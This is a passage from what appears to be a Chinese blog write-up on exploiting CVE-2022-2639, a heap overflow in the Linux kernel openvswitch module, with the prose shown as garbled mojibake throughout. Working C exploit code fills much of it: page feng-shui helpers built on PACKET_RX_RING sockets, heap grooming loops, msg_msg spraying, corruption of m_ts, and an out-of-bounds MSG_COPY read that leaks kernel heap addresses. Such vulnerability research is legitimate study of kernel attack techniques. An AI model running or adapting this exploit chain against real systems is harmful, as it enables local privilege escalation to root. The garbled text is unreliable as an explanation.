<p>ç®—ä¸Šæ·»åŠ è¿™ä¸ª <code>nlattr</code> æ‰€éœ€çš„ä¸¤å±‚ headerï¼ˆåµŒå¥—ï¼‰ï¼Œå³éœ€è¦ä½¿ç”¨ 0x04 + 0x04 + 0x0C &#x3D; 0x14 å­—èŠ‚çš„å†…å­˜å°±è®©æœ€å‰é¢æå‡ºçš„ <code>next_offset</code> çš„æŒ‡é’ˆå‰è¿› 0x04 + 0x04 + 0x0C * 2 &#x3D; 0x20 å­—èŠ‚ã€‚è™½ç„¶æ”¾å¤§æ¯”ä¾‹ä¸å¦‚ <code>sizeof(struct ovs_conntrack_info)</code>ï¼Œä½†å¥½åœ¨å…¶åœ¨èƒ½ç”¨æ¥æº¢å‡ºçš„å‰æä¸‹ï¼Œä¿è¯äº†æ›´ä¼˜çš„ç¨³å®šæ€§ï¼ˆæ— éœ€æ ¹æ®å†…æ ¸ç‰ˆæœ¬æ¥è®¡ç®—ç»“æ„ä½“çš„å¤§å°ä¸”ç²’åº¦è¾ƒå°ï¼Œæº¢å‡ºå†™ä¼šæ›´ç²¾ç¡®ï¼‰ã€‚<br>æœ€ååœ¨å›åˆ° <code>copy_action</code> ä¸­ï¼Œ<code>memcpy</code> çš„æ—¶å€™å°±ä¼šäº§ç”Ÿæº¢å‡ºã€‚ä¹Ÿå°±æ˜¯ç¬¬äºŒæ¬¡æ‹·è´å‰©ä½™çš„ <code>nlattr</code> æ—¶ï¼ˆç¬¬ä¸€æ¬¡æ˜¯å¯¹å‰é¢ <code>OVS_ACTION_ATTR_SET</code> æ¨åŠ¨ <code>next_offset</code> çš„æ“ä½œï¼‰ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>é‚£ä¹ˆç°åœ¨æ¼æ´å¾ˆæ˜æ˜¾ï¼šåœ¨ 0x10000 çš„ slab ä¸Šçš„å †æº¢å‡ºã€‚</p>
<p>ï¼ˆç”±äºæœ¬äººç»å¸¸å–œæ¬¢åœ¨çº¸ä¸Šå†™å†™ç”»ç”»ï¼Œæ‰€ä»¥ä¸‹é¢å¯èƒ½ä¼šå‡ºç°ä¸€äº›å¥‡æ€ªçš„ç¤ºæ„å›¾ç‰‡~~å…¶ä»–éå¸¸ç²¾ç¾çš„å›¾ç‰‡éƒ½æ¥è‡ª <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE æ¼æ´åˆ†æ</a>ï¼‰</p>
<p>ä»¥å¾€ç»å¸¸ä½¿ç”¨çš„æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>struct msg_msg</code> æ¯ä¸ªä¸»æ¶ˆæ¯æœ€å¤šä¸€ä¸ªé¡µå¤§å°ï¼Œå³ 0x1000ï¼Œåç»­çš„ <code>msg_msgseg</code> è™½ç„¶ä¼šå•é“¾è¡¨è¿æ¥ï¼Œä½†æ˜¯æƒ³ç›´æ¥è®©å‘ç”Ÿæº¢å‡ºçš„ 0x10000 çš„ slab åç´§æŒ¨ç€è¿™ä¸¤ç§ç»“æ„çš„æ¦‚ç‡æä½ã€‚æ‰€ä»¥æ—¢ç„¶éœ€è¦è·¨é¡µï¼Œä¸å¦‚ä½¿ç”¨é¡µé£æ°´æ¥è°ƒèŠ‚å†…å­˜å¸ƒå±€ï¼ˆæ›´å¤šå…³äºé¡µé£æ°´çš„åŸç†å’Œåˆ©ç”¨åç»­æ•´ç†å¥½ corCTF2022-cache-of-castaways å’Œ CVE-2022-27666 é“¾è¿‡å»~ï¼‰ã€‚è¯´åˆ°é¡µé£æ°´ï¼Œé‚£å°±è¦è¯·å‡º <code>setsockopt PACKET_TX_RING/PACKET_RX_RING</code> äº†ã€‚é€šè¿‡è¯¥å‡½æ•°ï¼Œå°±å¯ä»¥éšæ—¶ç”³è¯· 0x10000 çš„ slab å¹¶ä¸”éšæ—¶é‡Šæ”¾è¿™äº› slabã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">packet_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line">		<span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line">	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">		<span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">		lock_sock(sk);</span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		Â·Â·Â·</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">						    optname == PACKET_TX_RING);</span><br><span class="line">		&#125;</span><br><span class="line">		release_sock(sk);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">		Â·Â·Â·</span><br><span class="line">		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">		Â·Â·Â·</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">	buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">	gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* complete and utter failure */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»å¸¸ä½¿ç”¨çš„æ¿å­ï¼ˆä¹‹å‰è‡ªå·±å†™çš„ä¸æ˜¯å¾ˆçµæ´»ï¼Œç›´æ¥ç”¨ <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 å¸ˆå‚…åšå®¢</a> ä¸­çš„äº†ï¼Œæ­¤å¤–è¿˜æ”¶è·äº†å…¶ä»–ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„è½®å­ğŸ˜ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set parameter &amp; call setsockopt() to alloc RX_RING buffer</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;socket(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;bind(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// packet_socket_setup(size, 4096, count, 0, 100); æ•ˆæœç›¸åŒ</span></span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>) <span class="comment">// åˆ†é…ä¸€ä¸ª0x10000çš„chunk</span></span><br><span class="line">close(fd) <span class="comment">// é‡Šæ”¾ chunk</span></span><br><span class="line">    </span><br><span class="line">fd = pagealloc_pad(<span class="number">100</span>, <span class="number">0x1000</span>) <span class="comment">// åˆ†é… 100 ä¸ª 0x1000 çš„chunk</span></span><br><span class="line">close(fd) <span class="comment">// ä¸€æ¬¡æ€§é‡Šæ”¾è¿™ä¸ª100ä¸ªchunk</span></span><br></pre></td></tr></table></figure>



<h2 id="exploit-1ï¼šæ³„éœ²-0x400-slab-å †åœ°å€"><a href="#exploit-1ï¼šæ³„éœ²-0x400-slab-å †åœ°å€" class="headerlink" title="exploit-1ï¼šæ³„éœ² 0x400 slab å †åœ°å€"></a>exploit-1ï¼šæ³„éœ² 0x400 slab å †åœ°å€</h2><p>é¦–å…ˆåˆ©ç”¨ä¸Šè¿°æŠ€æœ¯æŠŠå†…æ ¸çš„å †å—æ•´ç†ï¼Œå°½å¯èƒ½çš„æ¶ˆè€—å®Œ freelist ä¸­çš„ç©ºé—² slabã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pagealloc_pad(<span class="number">1000</span>, <span class="number">0x1000</span>);    <span class="comment">// 1000*0x1000</span></span><br><span class="line">pagealloc_pad(<span class="number">500</span>, <span class="number">0x2000</span>);     <span class="comment">// 500*0x2000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x4000</span>);     <span class="comment">// 200*0x4000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x8000</span>);     <span class="comment">// 200*0x8000</span></span><br><span class="line">pagealloc_pad(<span class="number">100</span>, <span class="number">0x10000</span>);    <span class="comment">// 100*0x10000</span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€å†æ¬¡ç”³è¯· 0x10000 çš„ slabï¼Œç”±äºæ­¤æ—¶çš„å †å—å‡è¢«æ¸…ç†èµ°ä¸”ä¸å­˜åœ¨ 0x10000 çš„ç©ºé—² slabï¼Œé‚£ä¹ˆå†æ¬¡ç”³è¯· 0x10000 çš„ slab æ—¶ï¼Œå°±ä¼šä» order-5 çš„ 0x20000 çš„ slab ä¸­ç”³è¯·å†…å­˜ç„¶ååˆ†å‰²æˆä¸¤ä¸ª order-4 å³ 0x10000 çš„ slabã€‚<strong>å› æ­¤æ­¤æ—¶åˆ†é…çš„ 0x10000 çš„ slab åœ°å€æå¤§æ¦‚ç‡æ˜¯ç›¸é‚»çš„ã€‚</strong></p>
<p>æ¥ç€å°±æ˜¯å¸¸ç”¨çš„å¥—è·¯ï¼Œéš”ä¸€ä¸ªé‡Šæ”¾ä¸€ä¸ªï¼Œç”±äºåªæœ‰ä¸¤ä¸ªç›¸é‚»çš„ order-n slab éƒ½è¢«é‡Šæ”¾äº†æ‰ä¼šåˆå¹¶æˆ order-(n+1)ï¼Œæ‰€ä»¥æ­¤æ—¶å¹¶ä¸ä¼šåˆå¹¶ï¼Œåˆšé‡Šæ”¾çš„ 0x10000 çš„ slab åˆ™å‡åœç•™åœ¨ freelist ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> target_fd_cnt (0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> target_fd[target_fd_cnt];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; target_fd_cnt; i++)</span><br><span class="line">    target_fd[i] = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; target_fd_cnt; i+=<span class="number">2</span>) &#123;</span><br><span class="line">    close(target_fd[i]);</span><br><span class="line">    target_fd[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å¤§æ¦‚ç‡ä¼šå½¢æˆå¦‚ä¸‹çš„å †å¸ƒå±€ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-1.png"></p>
<p>æ¥ç€ spray <code>struct msg_msg</code>ï¼Œæ¯ä¸ª msg åŒ…å«ä¸€ä¸ª 0x1000 çš„ <code>struct msg_msg</code> å’Œä¸€ä¸ª 0x400 çš„ <code>struct msg_msgseg</code> ã€‚ç”±äºç¬¬ä¸€æ­¥å·²ç»å°† order å°çš„ slab éƒ½è€—å°½äº†ï¼Œæ­¤æ—¶åˆ†é…çš„ 0x1000 çš„ slab å’Œ 0x400 çš„ slab å¤§æ¦‚ç‡åˆä¼šä»æ­¤æ—¶å¤„åœ¨ freelist ä¸­çš„ order-4  çš„ 0x10000 çš„ slab åˆ†å‰²ï¼Œç›´åˆ°åˆ†å‰²åˆ° order-0ï¼Œåˆ†åˆ«ç»™è¿™ä¸¤ä¸ªæ¶ˆæ¯ç»“æ„ä½¿ç”¨ã€‚è¿™æ ·çš„è¯ï¼Œä¹‹å‰æ²¡é‡Šæ”¾çš„ <code>rx_ring buffer</code> çš„åé¢ï¼Œå¤§æ¦‚ç‡å°±ä¼šç´§æŒ¨ä¸€ä¸ª <code>struct msg_msg</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶å †ä¸­çš„å¸ƒå±€å¤§æ¦‚æ˜¯ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-2.png"></p>
<p>ç„¶åæŠŠåˆšæ‰åœ¨ order-4 ä¸­ç•™ä¸‹çš„å¦ä¸€åŠ 0x10000 ç»™é‡Šæ”¾æ‰ï¼Œæ­¤æ—¶åˆå› ä¸ºå…ˆå‰é‡Šæ”¾çš„ 0x10000 éƒ½è¢« <code>msgã€msgseg</code> å é¢†æˆ–è€…ä»¥å…¶ä»–è¢«åˆ‡å‰²åçš„å¤§å°å­˜åœ¨çš„ freelist ä¸­ï¼Œä¾ç„¶ä¸ä¼šå‘ä¸Šåˆå¹¶ã€‚æ‰€ä»¥æ­¤æ¬¡é‡Šæ”¾çš„ 0x10000 ä¹Ÿéƒ½ä¼šå­˜åœ¨ freelist ä¸­ã€‚æ­¤æ—¶å¸ƒç½®èƒ½åœ¨ 0x10000 çš„ slab ä¸­å‘ç”Ÿæº¢å‡ºçš„æ¼æ´å¯¹è±¡ï¼Œä»è€Œå¯ä»¥è¶Šç•Œè¦†å†™åˆ°ç›¸é‚»çš„ <code>struct msg_msg</code> çš„ <code>m_ts</code> å­—æ®µï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ <code>msg_msg</code> æ¥è¶Šç•Œè¯»æ³„éœ² 0x400 çš„è¾…åŠ©æ¶ˆæ¯åé¢çš„æ•°æ®ï¼Œæš‚ä¸”ç§°è¯¥ <code>msg_msg</code> ä¸º <text style="color:green">msg1</text>ï¼Œ<text style="color:green">msg1</text> å¯ä»¥é€šè¿‡ <code>msgrcv</code> çš„è¿”å›å€¼ä¸è¶Šç•Œä¿®æ”¹çš„ <code>m_ts</code> çš„å€¼æ˜¯å¦ç›¸ç­‰æ¥ç¡®å®šã€‚æ­¤æ—¶çš„å¤§æ¦‚å¸ƒå±€ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-3.png"></p>
<p>ç”±äºåœ¨ç”³è¯· 0x400 çš„ <code>msg_msgseg</code> æ—¶ï¼Œè¯¥ slab å¤§æ¦‚ç‡æ²¡æœ‰ä¸ºå…¶ä»–ä»»åŠ¡åˆ†é…å †å—ï¼Œæ‰€ä»¥å‡ ä¹ <code>msg_msgseg</code> åé¢éƒ½æ˜¯å¦ä¸€ä¸ª <code>msg_msg</code> çš„ <code>msg_msgseg</code>ï¼Œåœ¨å‘é€æ¶ˆæ¯ä¹Ÿå°±æ˜¯åˆ›å»ºè¿™äº› <code>msg_msg</code> çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åœ¨æ¶ˆæ¯ä¸­å¯¹è¯¥ <code>msg</code> è¿›è¡Œä¸€ä¸ªæ ‡è¯†ï¼Œè¿™æ ·å°±èƒ½ç¡®å®šä»»ä½•ä¸€ä¸ªæ¶ˆæ¯</strong>ã€‚å¯ä»¥åˆ©ç”¨ <text style="color:green">msg1</text> ï¼Œé€šè¿‡ <code>msgrcv</code> æ¥æ”¶æ¶ˆæ¯ä½†æ˜¯è®¾ç½® <code>MSG_COPY</code> è¯»å–åˆ°åé¢ <code>msg_msgseg</code> çš„æ ‡è¯†ï¼Œå‡è®¾è¢«è¯»å–çš„ <code>msg_msgseg</code> å±äº <text style="color:green">msg2</text>ï¼›é€šè¿‡ä¸å¸¦ <code>flag</code> çš„ <code>msgrcv</code> æ¥è¯»å– <text style="color:green">msg2</text>ï¼Œæ­¤æ—¶å°±é‡Šæ”¾äº† 0x1000 çš„ <code>msg_msg</code> å’Œè¯¥ 0x400 çš„ <code>msg_msgseg</code> ã€‚<strong>æ­¤æ—¶å†æ¬¡ spray å¤šä¸ª 0x400 çš„ <code>msg_msg</code>å½¢æˆä¸€ä¸ª <code>msg</code> é˜Ÿåˆ—ï¼Œå»å ç”¨åˆšåˆšé‡Šæ”¾çš„ msg_msgseg</strong>ï¼Œé˜Ÿåˆ—ç¤ºæ„å¦‚ä¸‹ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-4.png"></p>
<p>å…·ä½“ exp ä¸­çš„åšæ³•æ˜¯ä¿ç•™ <text style="color:green">msg1</text> çš„ <code>msqid</code> åœ¨ <code>list1_corrupted_msqid</code> ä¸­ï¼Œç„¶åé€šè¿‡ <code>msgget</code> æ”¹å˜å…¶åœ¨ <code>msqid[]</code>  ä¸­çš„å€¼ï¼Œé¿å… [3-7] å°†è¯¥ <text style="color:green">msg1</text> ä¹Ÿé‡Šæ”¾æ‰ï¼›ç„¶ååˆ¤æ–­ä¸€ä¸‹è¶Šç•Œè¯»åˆ°çš„å†…å­˜æ˜¯ä¸æ˜¯ <code>msg_msgseg</code>ï¼Œæ¥ç€å°†é™¤ <text style="color:green">msg1</text> ä»¥å¤–çš„å…¶ä»–æ¶ˆæ¯éƒ½é‡Šæ”¾æ‰ï¼Œè‡ªç„¶åŒ…æ‹¬äº†ä¸Šè¿°çš„ <text style="color:green">msg2</text>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="type">ssize_t</span> copy_size = msgrcv(msqid_1[i], msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">    <span class="keyword">if</span> (copy_size &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_size == MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>)) &#123; </span><br><span class="line">        logi(<span class="string">&quot;[+] corrupted msg_msg found, id: %d&quot;</span>, msqid_1[i]);</span><br><span class="line">        list1_corrupted_msqid = msqid_1[i];</span><br><span class="line">        msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">        <span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;oob_data[<span class="number">1</span>], <span class="string">&quot;QQQQQQQQ&quot;</span>, <span class="number">8</span>))</span><br><span class="line">            logd(<span class="string">&quot;[-] but the next object is not allocated by msg_msgseg&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list1_corrupted_msqid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] can&#x27;t find corrupted msg_msg, and kernel may crash :(&quot;</span>);</span><br><span class="line">    clean_msq1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-7] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq1();</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-8] alloc 0x400*16 `msg_msg` chain to re-acquire the 0x400 slab freed by msg_msgseg ...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(msg_b-&gt;mtext, <span class="string">&#x27;w&#x27;</span>, MSG_B_TEXT_SIZE);</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">0</span>] = MSG_SIG;</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">1</span>] = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++) &#123;</span><br><span class="line">        msg_b-&gt;mtype = MTYPE_B | (j &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            die(<span class="string">&quot;0x400 * 0x10 * NUM_MSQIDS_2 msgsnd() failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

